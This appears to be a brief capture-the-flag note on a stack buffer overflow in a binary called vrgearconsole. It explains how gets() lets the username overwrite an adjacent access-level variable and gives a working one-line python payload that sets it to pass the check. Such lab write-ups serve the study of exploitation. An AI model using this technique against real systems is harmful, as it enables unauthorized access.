buffer overflow exploit.

	int accesslevel = 0xff
	char username
	char password

all adjacent on stack. 

vuln: gets(username), gets(password)

gets() does not check for size, so we can overflow username into
accesslevel. challenge tests for auth if accesslevel between 0x00 and
0x30 exclusive. 

remember! we need to keep stdin open.

payload:
(python -c 'print "A"*16 + "#"; print "asdf"'; cat -) | ./vrgearconsole
